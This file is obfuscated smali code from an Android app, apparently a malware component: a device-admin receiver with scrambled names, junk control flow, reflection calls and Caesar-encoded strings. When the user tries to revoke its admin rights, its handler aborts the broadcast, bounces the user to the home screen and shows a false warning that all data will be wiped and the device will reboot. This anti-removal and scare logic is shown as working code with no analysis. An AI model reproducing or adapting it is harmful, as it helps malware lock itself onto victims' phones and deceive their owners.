.class public Lcom/EDzgPz/KwIOuS/myltAJ;
.super Landroid/app/admin/DeviceAdminReceiver;


# static fields
.field static final TAG:Ljava/lang/String; = "EfnpEfwjdfBenjoSfdfjwfs"


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-void

    nop

    goto :goto_2

    :goto_1
    nop

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xonDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 8
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    nop

    goto/16 :goto_11

    :goto_0
    nop

    return-object v2

    nop

    goto/16 :goto_12

    :goto_1
    nop

    const-string v2, "Uijt!bdujpo!xjmm!sftfu!bmm!zpvs!ebub/]o]oDmjdl!]#Zft]#!boe!zpvs](t!efwjdf!xjmm!sfcppu!boe!]#Op]#!gps!dbodfm/"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Landroid/content/Intent;

    aput-object v7, v5, v4

    aput-object v1, v6, v4

    const-string v4, "startActivity"

    const-class v7, Landroid/content/Context;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, p1, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    sget-object v7, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v7, v5, v4

    new-instance v7, Ljava/lang/Integer;

    invoke-direct {v7, v3}, Ljava/lang/Integer;-><init>(I)V

    aput-object v7, v6, v4

    const-string v4, "setFlags"

    const-class v7, Landroid/content/Intent;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v1, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v2, v6, v4

    const-string v4, "addCategory"

    const-class v7, Landroid/content/Intent;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v1, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_3

    :goto_5
    nop

    const-string v2, "boespje/joufou/dbufhpsz/IPNF"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_5

    :goto_7
    nop

    const-string v2, "boespje/joufou/bdujpo/NBJO"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_6

    :goto_8
    nop

    new-instance v1, Landroid/content/Intent;

    nop

    goto :goto_7

    :goto_9
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Landroid/content/Intent;

    aput-object v7, v5, v4

    aput-object v0, v6, v4

    const-string v4, "startActivity"

    const-class v7, Landroid/content/Context;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, p1, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_8

    :goto_a
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    sget-object v7, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v7, v5, v4

    new-instance v7, Ljava/lang/Integer;

    invoke-direct {v7, v3}, Ljava/lang/Integer;-><init>(I)V

    aput-object v7, v6, v4

    const-string v4, "setFlags"

    const-class v7, Landroid/content/Intent;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v0, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    sget-object v7, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v7, v5, v4

    new-instance v7, Ljava/lang/Integer;

    invoke-direct {v7, v2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v7, v6, v4

    const-string v4, "setFlags"

    const-class v7, Landroid/content/Intent;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v0, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_a

    :goto_c
    nop

    const/high16 v2, 0x40000000    # 2.0f

    nop

    goto :goto_b

    :goto_d
    nop

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_c

    :goto_e
    nop

    const-string v2, "boespje/tfuujoht/TFUUJOHT"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_d

    :goto_f
    nop

    new-instance v0, Landroid/content/Intent;

    nop

    goto :goto_e

    :goto_10
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/myltAJ;->abortBroadcast()V

    nop

    goto :goto_f

    :goto_11
    nop

    const/high16 v3, 0x10000000

    nop

    goto :goto_10

    :goto_12
    nop

    nop
.end method

.method private xonDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-void

    nop

    goto :goto_2

    :goto_1
    nop

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xonEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-void

    nop

    goto :goto_2

    :goto_1
    nop

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context;Landroid/content/Intent;)V

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 5

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/myltAJ;->xonDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;

    move-result-object v0

    return-object v0
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/myltAJ;->xonDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/myltAJ;->xonEnabled(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
